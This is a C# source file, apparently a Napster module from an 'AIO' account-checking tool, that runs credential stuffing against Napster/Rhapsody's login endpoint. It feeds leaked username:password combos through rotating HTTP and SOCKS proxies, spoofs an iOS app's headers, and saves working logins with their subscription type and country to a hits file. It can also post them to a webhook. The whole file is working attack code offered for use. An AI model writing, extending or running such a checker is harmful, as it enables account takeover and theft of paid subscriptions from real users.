using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Napstermod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.UserAgent = "Napster/3537 CFNetwork/1120 Darwin/19.0.0";
                            req.AddHeader("Host", "playback.rhapsody.com");
                            req.AddHeader("appId", "com.rhapsody.iphone.Rhapsody3");
                            req.AddHeader("appVersion", "6.5");
                            req.AddHeader("cpath", "app_iPad7_4");
                            req.AddHeader("deviceid", "4387508C-483B-479A-BBC1-E078269AE0S4");
                            req.AddHeader("ocode", "tablet_ios");
                            req.AddHeader("package_name", "com.rhapsody.iphone.Rhapsody3");
                            req.AddHeader("pcode", "tablet_ios");
                            req.AddHeader("playerType", "ios_6_5");
                            req.AddHeader("provisionedMCCMNC", "310+150");
                            req.AddHeader("rsrc", "ios_6.5");

                            var res = req.Post("https://playback.rhapsody.com/login.json",
                                string.Concat("username=" + array[0] + "&password=" + array[1] +
                                              "&devicename=Elite%20Money&provisionedMCCMNC=310%2B150&package_name=com.rhapsody.iphone.Rhapsody3"),
                                "application/x-www-form-urlencoded").ToString();

                            if (!res.Contains("INVALID_USERNAME_OR_PASSWORD"))
                            {
                                var text3 = Parse(res, "{\"accountType\":\"", "\"");
                                var text5 = Parse(res, "\"country\":\"", "\"");
                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Napster_hits",
                                    array[0] + ":" + array[1] + " | Sub: " + text3 + " | Country: " + text5);
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("Napster",
                                        array[0] + ":" + array[1] + " | Sub: " + text3 + " | Country: " + text5);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1], "Napster Hits");
                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}